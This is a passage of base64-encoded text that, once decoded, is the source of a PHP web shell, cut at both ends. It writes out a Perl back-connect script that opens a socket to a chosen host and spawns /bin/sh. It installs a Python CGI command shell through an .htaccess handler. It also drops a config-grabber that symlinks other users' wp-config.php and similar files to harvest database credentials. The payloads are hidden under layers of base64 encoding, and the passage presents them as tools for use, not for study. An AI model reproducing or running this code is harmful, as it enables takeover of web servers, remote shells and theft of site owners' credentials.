daR2xsSUNnaVUyOWphMlYwSUVWeWNtOXlYRzRpS1RzTkNpQWcNCklDQWdJRzE1SUNSMFlYSm5aWFFnUFNCcGJtVjBYMkYwYjI0b0pHaHZjM1FwT3cwS0lDQWdJQ0FnYVdZZ0tDRmpiMjV1WldOMEtGTkYNClVsWkZVaXdnY0dGamF5QWlVMjVCTkhnNElpd2dNaXdnSkhCdmNuUXNJQ1IwWVhKblpYUXBLU0I3RFFvZ0lDQWdJQ0FnSUdScFpTZ2kNClZXNWhZbXhsSUhSdklFTnZibTVsWTNSY2JpSXBPdzBLSUNBZ0lDQWdmUTBLSUNBZ0lDQWdjSEpwYm5RZ0lsc3FYU0JUY0dGM2JtbHUNClp5QlRhR1ZzYkZ4dUlqc05DaUFnSUNBZ0lHbG1JQ2doWm05eWF5Z2dLU2tnZXcwS0lDQWdJQ0FnSUNCdmNHVnVLRk5VUkVsT0xDSSsNCkpsTkZVbFpGVWlJcE93MEtJQ0FnSUNBZ0lDQnZjR1Z1S0ZOVVJFOVZWQ3dpUGlaVFJWSldSVklpS1RzTkNpQWdJQ0FnSUNBZ2IzQmwNCmJpaFRWRVJGVWxJc0lqNG1VMFZTVmtWU0lpazdEUW9nSUNBZ0lDQWdJR1Y0WldNZ2V5Y3ZZbWx1TDNOb0ozMGdKeTFpWVhOb0p5QXUNCklDSmNNQ0lnZUNBME93MEtJQ0FnSUNBZ0lDQmxlR2wwS0RBcE93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2NISnBiblFnSWxzcVhTQkUNCllYUmhZMmhsWkZ4dVhHNGlPdz09JzsNCg0KJGZpbGUgPSBmb3BlbigiZGMucGwiICwidysiKTsNCiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJG5ldGNhdHNoZWxsKSk7DQpmY2xvc2UoJGZpbGUpOw0KICAgIGNobW9kKCJkYy5wbCIsMDc1NSk7DQplY2hvICI8aWZyYW1lIHNyYz1jZ2lzaGVsbC9pem8uY2luIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsNCn0NCmlmIChpc3NldCgkX1BPU1RbJ1N1Ym1pdDE0J10pKQ0Kew0KICAgIG1rZGlyKCdweXRob24nLCAwNzU1KTsNCiAgICBjaGRpcigncHl0aG9uJyk7DQogICAgICAgICRrb2tkb3N5YSA9ICIuaHRhY2Nlc3MiOw0KICAgICAgICAkZG9zeWFfYWRpID0gIiRrb2tkb3N5YSI7DQogICAgICAgICRkb3N5YSA9IGZvcGVuICgkZG9zeWFfYWRpICwgJ3cnKSBvciBkaWUgKCJEb3N5YSBh0JPCp9CUwrFsYW1hZNCUwrEhIik7DQogICAgICAgICRtZXRpbiA9ICJBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLml6byI7ICAgIA0KICAgICAgICBmd3JpdGUgKCAkZG9zeWEgLCAkbWV0aW4gKSA7DQogICAgICAgIGZjbG9zZSAoJGRvc3lhKTsNCiRweXRob25wID0gJ0l5RXZkWE55TDJKcGJpOXdlWFJvYjI0S0l5QXdOeTB3Tnkwd05Bb2pJSFl4TGpBdU1Bb0tJeUJqWjJrdGMyaGxiR3d1Y0hrS0l5QkINCklITnBiWEJzWlNCRFIwa2dkR2hoZENCbGVHVmpkWFJsY3lCaGNtSnBkSEpoY25rZ2MyaGxiR3dnWTI5dGJXRnVaSE11Q2dvS0l5QkQNCmIzQjVjbWxuYUhRZ1RXbGphR0ZsYkNCR2IyOXlaQW9qSUZsdmRTQmhjbVVnWm5KbFpTQjBieUJ0YjJScFpua3NJSFZ6WlNCaGJtUWcNCmNtVnNhV05sYm5ObElIUm9hWE1nWTI5a1pTNEtDaU1nVG04Z2QyRnljbUZ1ZEhrZ1pYaHdjbVZ6Y3lCdmNpQnBiWEJzYVdWa0lHWnYNCmNpQjBhR1VnWVdOamRYSmhZM2tzSUdacGRHNWxjM01nZEc4Z2NIVnljRzl6WlNCdmNpQnZkR2hsY25kcGMyVWdabTl5SUhSb2FYTWcNClkyOWtaUzR1TGk0S0l5QlZjMlVnWVhRZ2VXOTFjaUJ2ZDI0Z2NtbHpheUFoSVNFS0NpTWdSUzF0WVdsc0lHMXBZMmhoWld3Z1FWUWcNClptOXZjbVFnUkU5VUlHMWxJRVJQVkNCMWF3b2pJRTFoYVc1MFlXbHVaV1FnWVhRZ2QzZDNMblp2YVdSemNHRmpaUzV2Y21jdWRXc3YNCllYUnNZVzUwYVdKdmRITXZjSGwwYUc5dWRYUnBiSE11YUhSdGJBb0tJaUlpQ2tFZ2MybHRjR3hsSUVOSFNTQnpZM0pwY0hRZ2RHOGcNClpYaGxZM1YwWlNCemFHVnNiQ0JqYjIxdFlXNWtjeUIyYVdFZ1EwZEpMZ29pSWlJS0l5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoNCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXdvaklFbHRjRzl5ZEhNS2RISjUNCk9nb2dJQ0FnYVcxd2IzSjBJR05uYVhSaU95QmpaMmwwWWk1bGJtRmliR1VvS1FwbGVHTmxjSFE2Q2lBZ0lDQndZWE56Q21sdGNHOXkNCmRDQnplWE1zSUdObmFTd2diM01LYzNsekxuTjBaR1Z5Y2lBOUlITjVjeTV6ZEdSdmRYUUtabkp2YlNCMGFXMWxJR2x0Y0c5eWRDQnoNCmRISm1kR2x0WlFwcGJYQnZjblFnZEhKaFkyVmlZV05yQ21aeWIyMGdVM1J5YVc1blNVOGdhVzF3YjNKMElGTjBjbWx1WjBsUENtWnkNCmIyMGdkSEpoWTJWaVlXTnJJR2x0Y0c5eWRDQndjbWx1ZEY5bGVHTUtDaU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoNCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TUtJeUJqYjI1emRHRnVkSE1LQ21admJuUnMNCmFXNWxJRDBnSnp4R1QwNVVJRU5QVEU5U1BTTTBNalF5TkRJZ2MzUjViR1U5SW1admJuUXRabUZ0YVd4NU9uUnBiV1Z6TzJadmJuUXQNCmMybDZaVG94TW5CME95SStKd3AyWlhKemFXOXVjM1J5YVc1bklEMGdKMVpsY25OcGIyNGdNUzR3TGpBZ04zUm9JRXAxYkhrZ01qQXcNCk5DY0tDbWxtSUc5ekxtVnVkbWx5YjI0dWFHRnpYMnRsZVNnaVUwTlNTVkJVWDA1QlRVVWlLVG9LSUNBZ0lITmpjbWx3ZEc1aGJXVWcNClBTQnZjeTVsYm5acGNtOXVXeUpUUTFKSlVGUmZUa0ZOUlNKZENtVnNjMlU2Q2lBZ0lDQnpZM0pwY0hSdVlXMWxJRDBnSWlJS0NrMUYNClZFaFBSQ0E5SUNjaVVFOVRWQ0luQ2dvakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoNCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qQ2lNZ1VISnBkbUYwWlNCbWRXNWpkR2x2Ym5NZ1lXNWtJSFpoY21saFlteGwNCmN3b0taR1ZtSUdkbGRHWnZjbTBvZG1Gc2RXVnNhWE4wTENCMGFHVm1iM0p0TENCdWIzUndjbVZ6Wlc1MFBTY25LVG9LSUNBZ0lDSWkNCklsUm9hWE1nWm5WdVkzUnBiMjRzSUdkcGRtVnVJR0VnUTBkSklHWnZjbTBzSUdWNGRISmhZM1J6SUhSb1pTQmtZWFJoSUdaeWIyMGcNCmFYUXNJR0poYzJWa0lHOXVDaUFnSUNCMllXeDFaV3hwYzNRZ2NHRnpjMlZrSUdsdUxpQkJibmtnYm05dUxYQnlaWE5sYm5RZ2RtRnMNCmRXVnpJR0Z5WlNCelpYUWdkRzhnSnljZ0xTQmhiSFJvYjNWbmFDQjBhR2x6SUdOaGJpQmlaU0JqYUdGdVoyVmtMZ29nSUNBZ0tHVXUNClp5NGdkRzhnY21WMGRYSnVJRTV2Ym1VZ2MyOGdlVzkxSUdOaGJpQjBaWE4wSUdadmNpQnRhWE56YVc1bklHdGxlWGR2Y21SeklDMGcNCmQyaGxjbVVnSnljZ2FYTWdZU0IyWVd4cFpDQmhibk4zWlhJZ1luVjBJSFJ2SUdoaGRtVWdkR2hsSUdacFpXeGtJRzFwYzNOcGJtY2cNCmFYTnVKM1F1S1NJaUlnb2dJQ0FnWkdGMFlTQTlJSHQ5Q2lBZ0lDQm1iM0lnWm1sbGJHUWdhVzRnZG1Gc2RXVnNhWE4wT2dvZ0lDQWcNCklDQWdJR2xtSUc1dmRDQjBhR1ZtYjNKdExtaGhjMTlyWlhrb1ptbGxiR1FwT2dvZ0lDQWdJQ0FnSUNBZ0lDQmtZWFJoVzJacFpXeGsNClhTQTlJRzV2ZEhCeVpYTmxiblFLSUNBZ0lDQWdJQ0JsYkhObE9nb2dJQ0FnSUNBZ0lDQWdJQ0JwWmlBZ2RIbHdaU2gwYUdWbWIzSnQNClcyWnBaV3hrWFNrZ0lUMGdkSGx3WlNoYlhTazZDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmtZWFJoVzJacFpXeGtYU0E5SUhSb1pXWnYNCmNtMWJabWxsYkdSZExuWmhiSFZsQ2lBZ0lDQWdJQ0FnSUNBZ0lHVnNjMlU2Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IyWVd4MVpYTWcNClBTQnRZWEFvYkdGdFltUmhJSGc2SUhndWRtRnNkV1VzSUhSb1pXWnZjbTFiWm1sbGJHUmRLU0FnSUNBZ0l5QmhiR3h2ZDNNZ1ptOXkNCklHeHBjM1FnZEhsd1pTQjJZV3gxWlhNS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdSaGRHRmJabWxsYkdSZElEMGdkbUZzZFdWekNpQWcNCklDQnlaWFIxY200Z1pHRjBZUW9LQ25Sb1pXWnZjbTFvWldGa0lEMGdJaUlpUEVoVVRVdytQRWhGUVVRK1BGUkpWRXhGUG1ObmFTMXoNCmFHVnNiQzV3ZVNBdElHRWdRMGRKSUdKNUlFWjFlbnA1YldGdVBDOVVTVlJNUlQ0OEwwaEZRVVErQ2p4Q1QwUlpQanhEUlU1VVJWSSsNCkNqeElNVDVYWld4amIyMWxJSFJ2SUdObmFTMXphR1ZzYkM1d2VTQXRJRHhDVWo1aElGQjVkR2h2YmlCRFIwazhMMGd4UGdvOFFqNDgNClNUNUNlU0JHZFhwNmVXMWhiand2UWo0OEwwaytQRUpTUGdvaUlpSXJabTl1ZEd4cGJtVWdLeUpXWlhKemFXOXVJRG9nSWlBcklIWmwNCmNuTnBiMjV6ZEhKcGJtY2dLeUFpSWlJc0lGSjFibTVwYm1jZ2IyNGdPaUFpSWlJZ0t5QnpkSEptZEdsdFpTZ25KVWs2SlUwZ0pYQXMNCklDVkJJQ1ZrSUNWQ0xDQWxXU2NwS3ljdVBDOURSVTVVUlZJK1BFSlNQaWNLQ25Sb1pXWnZjbTBnUFNBaUlpSThTREkrUlc1MFpYSWcNClEyOXRiV0Z1WkR3dlNESStDanhHVDFKTklFMUZWRWhQUkQxY0lpSWlJaUFySUUxRlZFaFBSQ0FySUNjaUlHRmpkR2x2YmowaUp5QXINCklITmpjbWx3ZEc1aGJXVWdLeUFpSWlKY0lqNEtQR2x1Y0hWMElHNWhiV1U5WTIxa0lIUjVjR1U5ZEdWNGRENDhRbEkrQ2p4cGJuQjENCmRDQjBlWEJsUFhOMVltMXBkQ0IyWVd4MVpUMGlVM1ZpYldsMElqNDhRbEkrQ2p3dlJrOVNUVDQ4UWxJK1BFSlNQaUlpSWdwaWIyUjUNClpXNWtJRDBnSnp3dlFrOUVXVDQ4TDBoVVRVdytKd3BsY25KdmNtMWxjM01nUFNBblBFTkZUbFJGVWo0OFNESStVMjl0WlhSb2FXNW4NCklGZGxiblFnVjNKdmJtYzhMMGd5UGp4Q1VqNDhVRkpGUGljS0NpTWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoNCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNS0l5QnRZV2x1SUdKdlpIa2diMllnZEdobElITmoNCmNtbHdkQW9LYVdZZ1gxOXVZVzFsWDE4Z1BUMGdKMTlmYldGcGJsOWZKem9LSUNBZ0lIQnlhVzUwSUNKRGIyNTBaVzUwTFhSNWNHVTYNCklIUmxlSFF2YUhSdGJDSWdJQ0FnSUNBZ0lDQWpJSFJvYVhNZ2FYTWdkR2hsSUdobFlXUmxjaUIwYnlCMGFHVWdjMlZ5ZG1WeUNpQWcNCklDQndjbWx1ZENBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSXlCemJ5QnBjeUIwYUdseklHSnMNCllXNXJJR3hwYm1VS0lDQWdJR1p2Y20wZ1BTQmpaMmt1Um1sbGJHUlRkRzl5WVdkbEtDa0tJQ0FnSUdSaGRHRWdQU0JuWlhSbWIzSnQNCktGc25ZMjFrSjEwc1ptOXliU2tLSUNBZ0lIUm9aV050WkNBOUlHUmhkR0ZiSjJOdFpDZGRDaUFnSUNCd2NtbHVkQ0IwYUdWbWIzSnQNCmFHVmhaQW9nSUNBZ2NISnBiblFnZEdobFptOXliUW9nSUNBZ2FXWWdkR2hsWTIxa09nb2dJQ0FnSUNBZ0lIQnlhVzUwSUNjOFNGSSsNClBFSlNQanhDVWo0bkNpQWdJQ0FnSUNBZ2NISnBiblFnSnp4Q1BrTnZiVzFoYm1RZ09pQW5MQ0IwYUdWamJXUXNJQ2M4UWxJK1BFSlMNClBpY0tJQ0FnSUNBZ0lDQndjbWx1ZENBblVtVnpkV3gwSURvZ1BFSlNQanhDVWo0bkNpQWdJQ0FnSUNBZ2RISjVPZ29nSUNBZ0lDQWcNCklDQWdJQ0JqYUdsc1pGOXpkR1JwYml3Z1kyaHBiR1JmYzNSa2IzVjBJRDBnYjNNdWNHOXdaVzR5S0hSb1pXTnRaQ2tLSUNBZ0lDQWcNCklDQWdJQ0FnWTJocGJHUmZjM1JrYVc0dVkyeHZjMlVvS1FvZ0lDQWdJQ0FnSUNBZ0lDQnlaWE4xYkhRZ1BTQmphR2xzWkY5emRHUnYNCmRYUXVjbVZoWkNncENpQWdJQ0FnSUNBZ0lDQWdJR05vYVd4a1gzTjBaRzkxZEM1amJHOXpaU2dwQ2lBZ0lDQWdJQ0FnSUNBZ0lIQnkNCmFXNTBJSEpsYzNWc2RDNXlaWEJzWVdObEtDZGNiaWNzSUNjOFFsSStKeWtLQ2lBZ0lDQWdJQ0FnWlhoalpYQjBJRVY0WTJWd2RHbHYNCmJpd2daVG9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0l5QmhiaUJsY25KdmNpQnBiaUJsZUdWamRYUnBibWNnZEdobElHTnYNCmJXMWhibVFLSUNBZ0lDQWdJQ0FnSUNBZ2NISnBiblFnWlhKeWIzSnRaWE56Q2lBZ0lDQWdJQ0FnSUNBZ0lHWWdQU0JUZEhKcGJtZEoNClR5Z3BDaUFnSUNBZ0lDQWdJQ0FnSUhCeWFXNTBYMlY0WXlobWFXeGxQV1lwQ2lBZ0lDQWdJQ0FnSUNBZ0lHRWdQU0JtTG1kbGRIWmgNCmJIVmxLQ2t1YzNCc2FYUnNhVzVsY3lncENpQWdJQ0FnSUNBZ0lDQWdJR1p2Y2lCc2FXNWxJR2x1SUdFNkNpQWdJQ0FnSUNBZ0lDQWcNCklDQWdJQ0J3Y21sdWRDQnNhVzVsQ2dvZ0lDQWdjSEpwYm5RZ1ltOWtlV1Z1WkFvS0NpSWlJZ3BVVDBSUEwwbFRVMVZGVXdvS0NncEQNClNFRk9SMFZNVDBjS0NqQTNMVEEzTFRBMElDQWdJQ0FnSUNCV1pYSnphVzl1SURFdU1DNHdDa0VnZG1WeWVTQmlZWE5wWXlCemVYTjANClpXMGdabTl5SUdWNFpXTjFkR2x1WnlCemFHVnNiQ0JqYjIxdFlXNWtjeTRLU1NCdFlYa2daWGh3WVc1a0lHbDBJR2x1ZEc4Z1lTQncNCmNtOXdaWElnSjJWdWRtbHliMjV0Wlc1MEp5QjNhWFJvSUhObGMzTnBiMjRnY0dWeWMybHpkR1Z1WTJVdUxpNEtJaUlpJzsNCg0KJGZpbGUgPSBmb3BlbigicHl0aG9uLml6byIgLCJ3KyIpOw0KJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkcHl0aG9ucCkpOw0KZmNsb3NlKCRmaWxlKTsNCiAgICBjaG1vZCgicHl0aG9uLml6byIsMDc1NSk7DQogICBlY2hvICI8aWZyYW1lIHNyYz1weXRob24vcHl0aG9uLml6byB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7DQp9DQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxMSddKSkNCnsNCiAgICBta2RpcignYWxsY29uZmlnJywgMDc1NSk7DQogICAgY2hkaXIoJ2FsbGNvbmZpZycpOw0KICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsNCiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOw0KICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYdCTwqfQlMKxbGFtYWTQlMKxISIpOw0KICAgICAgICAkbWV0aW4gPSAiQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5pem8iOyAgICANCiAgICAgICAgZndyaXRlICggJGRvc3lhICwgJG1ldGluICkgOw0KICAgICAgICBmY2xvc2UgKCRkb3N5YSk7DQokY29uZmlnc2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNJQzFKTDNWemNpOXNiMk5oYkM5aVlXNWtiV2x1Q25CeWFXNTBJQ0pEYjI1MFpXNTBMWFI1Y0dVNklIUmxlSFF2YUhSdGJGeHVYRzRpT3dwd2NtbHVkQ2M4SVVSUFExUlpVRVVnYUhSdGJDQlFWVUpNU1VNZ0lpMHZMMWN6UXk4dlJGUkVJRmhJVkUxTUlERXVNQ0JVY21GdWMybDBhVzl1WVd3dkwwVk9JaUFpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2VkZJdmVHaDBiV3d4TDBSVVJDOTRhSFJ0YkRFdGRISmhibk5wZEdsdmJtRnNMbVIwWkNJK0NqeG9kRzFzSUhodGJHNXpQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh4T1RrNUwzaG9kRzFzSWo0S1BHaGxZV1ErQ2p4dFpYUmhJR2gwZEhBdFpYRjFhWFk5SWtOdmJuUmxiblF0VEdGdVozVmhaMlVpSUdOdmJuUmxiblE5SW1WdUxYVnpJaUF2UGdvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSWdMejRLUEhScGRHeGxQbHQrWFNCRGVXSXpjaTFFV2lCRGIyNW1hV2NnTFNCYmZsMGdQQzkwYVhSc1pUNEtQSE4wZVd4bElIUjVjR1U5SW5SbGVIUXZZM056SWo0S0xtNWxkMU4wZVd4bE1TQjdDaUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3dvZ1ptOXVkQzF6YVhwbE9pQjRMWE50WVd4c093b2dabTl1ZEMxM1pXbG5hSFE2SUdKdmJHUTdDaUJqYjJ4dmNqb2dJekF3UmtaR1Jqc0tJQ0IwWlhoMExXRnNhV2R1T2lCalpXNTBaWEk3Q24wS1BDOXpkSGxzWlQ0S1BDOW9aV0ZrUGdvbk93cHpkV0lnYkdsc2V3b2dJQ0FnS0NSMWMyVnlLU0E5SUVCZk93b2tiWE55SUQwZ2NYaDdjSGRrZlRzS0pHdHZiR0U5SkcxemNpNGlMeUl1SkhWelpYSTdDaVJyYjJ4aFBYNXpMMXh1THk5bk95QUtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMmx1WTJ4MVpHVnpMMk52Ym1acFozVnlaUzV3YUhBbkxDUnJiMnhoTGljdGMyaHZjQzUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMkZ0WlcxaVpYSXZZMjl1Wm1sbkxtbHVZeTV3YUhBbkxDUnJiMnhoTGljdFlXMWxiV0psY2k1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJOdmJtWnBaeTVwYm1NdWNHaHdKeXdrYTI5c1lTNG5MV0Z0WlcxaVpYSXlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZiV1Z0WW1WeWN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXRaVzFpWlhKekxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6SXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOW1iM0oxYlM5cGJtTnNkV1JsY3k5amIyNW1hV2N1Y0dod0p5d2thMjlzWVM0bkxXWnZjblZ0TG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WVdSdGFXNHZZMjl1Wmk1d2FIQW5MQ1JyYjJ4aExpYzFMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZV1J0YVc0dlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6UXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOTNjQzFqYjI1bWFXY3VjR2h3Snl3a2EyOXNZUzRuTFhkd01UTXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWliRzluTDNkd0xXTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3RkM0F0WW14dlp5NTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyTnZibVpmWjJ4dlltRnNMbkJvY0Njc0pHdHZiR0V1SnpZdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5cGJtTnNkV1JsTDJSaUxuQm9jQ2NzSkd0dmJHRXVKemN1ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlqYjI1dVpXTjBMbkJvY0Njc0pHdHZiR0V1SnpndWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGExOWpiMjVtTG5Cb2NDY3NKR3R2YkdFdUp6a3VkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOXBibU5zZFdSbEwyTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3hNaTUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMnB2YjIxc1lTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXFiMjl0YkdFdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5MllpOXBibU5zZFdSbGN5OWpiMjVtYVdjdWNHaHdKeXdrYTI5c1lTNG5MWFppTG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YVc1amJIVmtaWE12WTI5dVptbG5MbkJvY0Njc0pHdHZiR0V1SnkxcGJtTnNkV1JsY3kxMllpNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZG9iUzlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTEzYUcweE5TNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZG9iV012WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0ZDJodFl6RTJMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZkMmh0WTNNdlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljdGQyaHRZM011ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzl6ZFhCd2IzSjBMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MWE4xY0hCdmNuUXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp6RjNhRzFqY3k1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDNOMVltMXBkSFJwWTJ0bGRDNXdhSEFuTENScmIyeGhMaWN0ZDJodFkzTXlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZMnhwWlc1MGN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWpiR2xsYm5SekxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyeHBaVzUwTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdOc2FXVnVkQzUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMk5zYVdWdWRHVnpMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MV05zYVdWdWRITXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWlhV3hzYVc1bkwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxXSnBiR3hwYm1jdWRIaDBKeWs3SUFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmJXRnVZV2RsTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdKcGJHeHBibWN1ZEhoMEp5azdJQXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YlhrdlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljdFltbHNiR2x1Wnk1MGVIUW5LVHNnQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGVYTm9iM0F2WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0WW1sc2JHbHVaeTUwZUhRbktUc2dDbjBLYVdZZ0tDUkZUbFo3SjFKRlVWVkZVMVJmVFVWVVNFOUVKMzBnWlhFZ0oxQlBVMVFuS1NCN0NpQWdjbVZoWkNoVFZFUkpUaXdnSkdKMVptWmxjaXdnSkVWT1Zuc25RMDlPVkVWT1ZGOU1SVTVIVkVnbmZTazdDbjBnWld4elpTQjdDaUFnSkdKMVptWmxjaUE5SUNSRlRsWjdKMUZWUlZKWlgxTlVVa2xPUnlkOU93cDlDa0J3WVdseWN5QTlJSE53YkdsMEtDOG1MeXdnSkdKMVptWmxjaWs3Q21admNtVmhZMmdnSkhCaGFYSWdLRUJ3WVdseWN5a2dld29nSUNna2JtRnRaU3dnSkhaaGJIVmxLU0E5SUhOd2JHbDBLQzg5THl3Z0pIQmhhWElwT3dvZ0lDUnVZVzFsSUQxK0lIUnlMeXN2SUM4N0NpQWdKRzVoYldVZ1BYNGdjeThsS0Z0aExXWkJMVVl3TF